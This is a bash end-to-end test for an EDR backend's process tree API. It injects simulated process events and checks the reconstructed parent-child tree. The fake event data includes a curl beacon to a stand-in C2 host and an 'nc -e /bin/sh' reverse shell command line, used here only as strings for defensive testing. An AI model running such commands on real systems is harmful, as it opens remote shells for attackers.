#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# test_process_tree.sh — End-to-end test for the process tree API.
#
# What it does:
#   1. Checks that the backend is reachable (health endpoint)
#   2. Injects a simulated process tree via the /events/inject endpoint:
#        systemd (PID 1) → sshd (PID 500) → bash (PID 1001) → curl (PID 1002)
#                                                             → python (PID 1003) → nc (PID 1004)
#   3. Queries the process tree API at various PIDs and depths
#   4. Validates the response structure
#
# Prerequisites:
#   - edr-backend running on localhost:8080 (with PostgreSQL)
#   - No auth configured (dev mode) OR set EDR_TOKEN below
#   - curl and jq installed
#
# Usage:
#   ./scripts/test_process_tree.sh                    # default localhost:8080
#   EDR_BACKEND=http://10.0.0.5:8080 ./scripts/test_process_tree.sh
#   EDR_TOKEN="your-jwt-or-apikey" ./scripts/test_process_tree.sh
# ─────────────────────────────────────────────────────────────────────────────

set -euo pipefail

BACKEND="${EDR_BACKEND:-http://localhost:8080}"
TOKEN="${EDR_TOKEN:-}"
EDR_USER="${EDR_USER:-user1}"
EDR_PASS="${EDR_PASS:-password123}"
AGENT_ID="test-agent-ptree-$$"  # unique per run
PASS=0
FAIL=0

# ── Helpers ──────────────────────────────────────────────────────────────────

bold()  { printf '\033[1m%s\033[0m' "$*"; }
green() { printf '\033[32m%s\033[0m\n' "$*"; }
red()   { printf '\033[31m%s\033[0m\n' "$*"; }
blue()  { printf '\033[34m%s\033[0m\n' "$*"; }

auth_header() {
    if [ -n "$TOKEN" ]; then
        echo "Authorization: Bearer $TOKEN"
    else
        echo "X-No-Auth: true"
    fi
}

api_get() {
    curl -sf -H "$(auth_header)" -H "Content-Type: application/json" "$BACKEND$1" 2>/dev/null
}

api_post() {
    curl -sf -H "$(auth_header)" -H "Content-Type: application/json" -X POST -d "$2" "$BACKEND$1" 2>/dev/null
}

assert_eq() {
    local desc="$1" expected="$2" actual="$3"
    if [ "$expected" = "$actual" ]; then
        green "  ✓ $desc"
        PASS=$((PASS + 1))
    else
        red "  ✗ $desc (expected: $expected, got: $actual)"
        FAIL=$((FAIL + 1))
    fi
}

assert_not_empty() {
    local desc="$1" actual="$2"
    if [ -n "$actual" ] && [ "$actual" != "null" ]; then
        green "  ✓ $desc"
        PASS=$((PASS + 1))
    else
        red "  ✗ $desc (got empty/null)"
        FAIL=$((FAIL + 1))
    fi
}

# ── Preflight ────────────────────────────────────────────────────────────────

echo ""
blue "═══════════════════════════════════════════════════════════"
blue "  Process Tree Reconstruction — E2E Test"
blue "═══════════════════════════════════════════════════════════"
echo ""
echo "  Backend:  $BACKEND"
echo "  Agent ID: $AGENT_ID"
echo ""

# Check backend is up.
blue "── Step 0: Health check ──"
HEALTH=$(curl -sf "$BACKEND/health" 2>/dev/null || true)
if [ -z "$HEALTH" ]; then
    red "Backend not reachable at $BACKEND"
    echo ""
    echo "Start it first:"
    echo "  cd edr-backend && make docker-up"
    echo "  # or: make run (with local postgres)"
    exit 1
fi
green "  ✓ Backend is up"

# Auto-login if no token provided.
if [ -z "$TOKEN" ]; then
    blue "── Authenticating as $EDR_USER ──"
    LOGIN_RESP=$(curl -sf -X POST "$BACKEND/api/v1/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$EDR_USER\",\"password\":\"$EDR_PASS\"}" 2>/dev/null || true)

    if [ -n "$LOGIN_RESP" ]; then
        TOKEN=$(echo "$LOGIN_RESP" | jq -r '.token // empty' 2>/dev/null || true)
    fi

    if [ -n "$TOKEN" ]; then
        green "  ✓ Authenticated (token acquired)"
    else
        echo "  ⚠ Login failed — trying without auth (dev mode)"
    fi
fi

# Check jq is available.
if ! command -v jq &>/dev/null; then
    red "jq is required but not installed. apt-get install jq"
    exit 1
fi

# ── Step 1: Find or create a test agent ──────────────────────────────────────

# The events table has a FK to agents(id), so we need a real agent.
# Use an existing agent or create a test one via direct DB insert.
blue "── Finding agent ──"

AGENTS_RESP=$(api_get "/api/v1/agents" || true)
AGENT_ID=$(echo "$AGENTS_RESP" | jq -r '.agents[0].id // empty' 2>/dev/null || true)

if [ -n "$AGENT_ID" ]; then
    AGENT_HOST=$(echo "$AGENTS_RESP" | jq -r '.agents[0].hostname // "unknown"' 2>/dev/null)
    green "  ✓ Using existing agent: $AGENT_HOST ($AGENT_ID)"
else
    red "  ✗ No agents found — start edr-agent first, or register one via gRPC"
    exit 1
fi

# ── Step 2: Inject a process tree ────────────────────────────────────────────

blue "── Step 1: Injecting simulated process tree ──"
echo ""
echo "  Tree structure:"
echo "    systemd (PID 1)"
echo "      └── sshd (PID 500)"
echo "            └── bash (PID 1001)"
echo "                  ├── curl (PID 1002)"
echo "                  └── python3 (PID 1003)"
echo "                        └── nc (PID 1004)"
echo ""

# Use a consistent base timestamp.
TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)

# Helper: inject a PROCESS_EXEC event.
inject_process() {
    local pid=$1 ppid=$2 comm=$3 exe=$4 cmdline=$5

    RESP=$(api_post "/api/v1/events/inject" "$(cat <<EOF
{
    "event_type": "PROCESS_EXEC",
    "hostname": "test-host",
    "agent_id": "$AGENT_ID",
    "payload": {
        "id": "evt-ptree-$pid-$$",
        "type": "PROCESS_EXEC",
        "timestamp": "$TS",
        "agent_id": "$AGENT_ID",
        "hostname": "test-host",
        "severity": 0,
        "process": {
            "pid": $pid,
            "ppid": $ppid,
            "tid": $pid,
            "uid": 0,
            "gid": 0,
            "euid": 0,
            "username": "root",
            "comm": "$comm",
            "exe_path": "$exe",
            "cmdline": "$cmdline",
            "cwd": "/",
            "args": ["$comm"],
            "start_time": "$TS"
        }
    }
}
EOF
    )" || true)

    if echo "$RESP" | jq -e '.event.id' &>/dev/null; then
        green "  ✓ Injected $comm (PID $pid, PPID $ppid)"
    else
        red "  ✗ Failed to inject $comm (PID $pid): $RESP"
        FAIL=$((FAIL + 1))
        return
    fi
    PASS=$((PASS + 1))
}

# Inject the tree bottom-up (order shouldn't matter for queries).
inject_process 1    0    "systemd"  "/usr/lib/systemd/systemd" "systemd --system"
inject_process 500  1    "sshd"     "/usr/sbin/sshd"           "sshd: listening"
inject_process 1001 500  "bash"     "/usr/bin/bash"            "bash --login"
inject_process 1002 1001 "curl"     "/usr/bin/curl"            "curl https://evil-c2.example.com/beacon"
inject_process 1003 1001 "python3"  "/usr/bin/python3"         "python3 reverse_shell.py"
inject_process 1004 1003 "nc"       "/usr/bin/nc"              "nc -e /bin/sh 10.0.0.99 4444"

echo ""

# ── Step 3: Query the process tree API ───────────────────────────────────────

blue "── Step 2: Querying process tree API ──"
echo ""

# Test 1: Get tree rooted at bash (PID 1001) — should have parent (sshd) and children (curl, python3).
blue "  Test 1: Tree at PID 1001 (bash)"
TREE=$(api_get "/api/v1/processes/1001/tree?agent_id=$AGENT_ID&depth=5" || true)

if [ -z "$TREE" ] || echo "$TREE" | jq -e '.error' &>/dev/null; then
    red "  ✗ API returned error: $(echo "$TREE" | jq -r '.error // "no response"')"
    FAIL=$((FAIL + 1))
else
    # The tree should be rooted at an ancestor (sshd or systemd).
    ROOT_PID=$(echo "$TREE" | jq '.tree.pid')
    ROOT_COMM=$(echo "$TREE" | jq -r '.tree.comm')
    assert_not_empty "tree returned" "$ROOT_PID"

    echo "    Response tree root: $ROOT_COMM (PID $ROOT_PID)"

    # Pretty-print the tree structure.
    echo ""
    echo "    Returned tree:"
    echo "$TREE" | jq -r '
        def indent(n): " " * (n * 4);
        def print_tree(node; depth):
            indent(depth) + "├── " + node.comm + " (PID " + (node.pid|tostring) + ", PPID " + (node.ppid|tostring) + ")",
            if node.children then
                (node.children[] | print_tree(.; depth + 1))
            else empty end;
        "    " + .tree.comm + " (PID " + (.tree.pid|tostring) + ")",
        if .tree.children then
            (.tree.children[] | print_tree(.; 1))
        else empty end
    ' 2>/dev/null || echo "    (jq tree print failed — raw response below)"

    # Validate: bash should appear somewhere in the tree.
    BASH_IN_TREE=$(echo "$TREE" | jq '[.. | .comm? // empty] | any(. == "bash")')
    assert_eq "bash appears in tree" "true" "$BASH_IN_TREE"

    # Validate: curl should appear as a child/descendant.
    CURL_IN_TREE=$(echo "$TREE" | jq '[.. | .comm? // empty] | any(. == "curl")')
    assert_eq "curl appears as descendant" "true" "$CURL_IN_TREE"

    # Validate: nc should appear (child of python3).
    NC_IN_TREE=$(echo "$TREE" | jq '[.. | .comm? // empty] | any(. == "nc")')
    assert_eq "nc appears as descendant" "true" "$NC_IN_TREE"
fi

echo ""

# Test 2: Get tree rooted at curl (PID 1002) — leaf node, no children.
blue "  Test 2: Tree at PID 1002 (curl — leaf node)"
TREE2=$(api_get "/api/v1/processes/1002/tree?agent_id=$AGENT_ID&depth=3" || true)

if [ -z "$TREE2" ] || echo "$TREE2" | jq -e '.error' &>/dev/null; then
    red "  ✗ API returned error: $(echo "$TREE2" | jq -r '.error // "no response"')"
    FAIL=$((FAIL + 1))
else
    # curl has ancestors but no children.
    CURL_IN_TREE=$(echo "$TREE2" | jq '[.. | .comm? // empty] | any(. == "curl")')
    assert_eq "curl is in the tree" "true" "$CURL_IN_TREE"

    # Should have bash as an ancestor.
    BASH_IN_TREE=$(echo "$TREE2" | jq '[.. | .comm? // empty] | any(. == "bash")')
    assert_eq "bash is an ancestor of curl" "true" "$BASH_IN_TREE"
fi

echo ""

# Test 3: Get tree rooted at nc (PID 1004) — deepest node.
blue "  Test 3: Tree at PID 1004 (nc — deepest node)"
TREE3=$(api_get "/api/v1/processes/1004/tree?agent_id=$AGENT_ID&depth=10" || true)

if [ -z "$TREE3" ] || echo "$TREE3" | jq -e '.error' &>/dev/null; then
    red "  ✗ API returned error: $(echo "$TREE3" | jq -r '.error // "no response"')"
    FAIL=$((FAIL + 1))
else
    # Walk up: nc → python3 → bash → sshd → systemd.
    ALL_COMMS=$(echo "$TREE3" | jq -r '[.. | .comm? // empty] | join(",")')
    echo "    All processes in tree: $ALL_COMMS"

    PYTHON_IN_TREE=$(echo "$TREE3" | jq '[.. | .comm? // empty] | any(. == "python3")')
    assert_eq "python3 is an ancestor of nc" "true" "$PYTHON_IN_TREE"

    SSHD_IN_TREE=$(echo "$TREE3" | jq '[.. | .comm? // empty] | any(. == "sshd")')
    assert_eq "sshd is an ancestor of nc" "true" "$SSHD_IN_TREE"
fi

echo ""

# Test 4: Depth limiting — request depth=1 from bash, should not see nc.
blue "  Test 4: Depth limiting (depth=1 from PID 1001)"
TREE4=$(api_get "/api/v1/processes/1001/tree?agent_id=$AGENT_ID&depth=1" || true)

if [ -z "$TREE4" ] || echo "$TREE4" | jq -e '.error' &>/dev/null; then
    red "  ✗ API returned error"
    FAIL=$((FAIL + 1))
else
    # With depth=1 from bash: children = curl + python3, but nc (depth=2) should be pruned.
    # However ancestors also use depth, so we may only get 1 level up.
    TREE4_COMMS=$(echo "$TREE4" | jq -r '[.. | .comm? // empty] | join(",")')
    echo "    Processes with depth=1: $TREE4_COMMS"
    assert_not_empty "tree returned with depth=1" "$TREE4_COMMS"
fi

echo ""

# Test 5: Non-existent PID should return an error.
blue "  Test 5: Non-existent PID"
TREE5=$(api_get "/api/v1/processes/99999/tree?agent_id=$AGENT_ID" 2>/dev/null || true)

if [ -z "$TREE5" ]; then
    green "  ✓ API returned error/empty for non-existent PID"
    PASS=$((PASS + 1))
elif echo "$TREE5" | jq -e '.error' &>/dev/null; then
    green "  ✓ API returned error: $(echo "$TREE5" | jq -r '.error' | head -c 60)"
    PASS=$((PASS + 1))
else
    red "  ✗ Expected error but got a response"
    FAIL=$((FAIL + 1))
fi

echo ""

# Test 6: Missing agent_id should return 400.
blue "  Test 6: Missing agent_id parameter"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "$(auth_header)" \
    "$BACKEND/api/v1/processes/1001/tree" 2>/dev/null)

if [ "$HTTP_CODE" = "400" ]; then
    green "  ✓ Returns 400 when agent_id missing"
    PASS=$((PASS + 1))
else
    red "  ✗ Expected HTTP 400, got $HTTP_CODE"
    FAIL=$((FAIL + 1))
fi

echo ""

# Test 7: Invalid PID should return 400.
blue "  Test 7: Invalid PID (non-numeric)"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "$(auth_header)" \
    "$BACKEND/api/v1/processes/notapid/tree?agent_id=$AGENT_ID" 2>/dev/null)

if [ "$HTTP_CODE" = "400" ]; then
    green "  ✓ Returns 400 for non-numeric PID"
    PASS=$((PASS + 1))
else
    red "  ✗ Expected HTTP 400, got $HTTP_CODE"
    FAIL=$((FAIL + 1))
fi

# ── Summary ──────────────────────────────────────────────────────────────────

echo ""
blue "═══════════════════════════════════════════════════════════"
TOTAL=$((PASS + FAIL))
if [ "$FAIL" -eq 0 ]; then
    green "  ALL $TOTAL TESTS PASSED"
else
    red "  $FAIL/$TOTAL TESTS FAILED"
fi
blue "═══════════════════════════════════════════════════════════"
echo ""

exit "$FAIL"
